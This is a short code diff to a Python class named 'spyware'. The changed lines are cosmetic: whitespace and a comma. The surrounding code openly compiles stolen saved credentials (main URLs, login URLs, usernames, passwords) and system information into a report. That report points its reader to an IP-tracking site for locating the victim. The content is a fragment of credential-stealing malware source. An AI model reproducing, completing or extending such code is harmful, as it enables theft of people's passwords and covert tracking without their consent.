@@ -70,7 +70,7 @@ class spyware:
                 final_ans += f"Main URL: {main_url}\n"
                 final_ans += f"Login URL: {login_url}\n"
                 final_ans += f"Username: {username}\n"
-                final_ans += f"Password: {password}\n\n"         
+                final_ans += f"Password: {password}\n\n"
             else:
                 continue
 
@@ -106,7 +106,7 @@ class spyware:
         return final_str
 
     def get_info(self):
-        system_info = "For tracking the user by ip go to: {}.\n".format("https://www.opentracker.net/feature/ip-tracker/")
+        system_info = "For tracking the user by ip, go to: {}.\n".format("https://www.opentracker.net/feature/ip-tracker/")
         try:
             system_info += self.get_system_info()
             system_info += self.get_passwords()
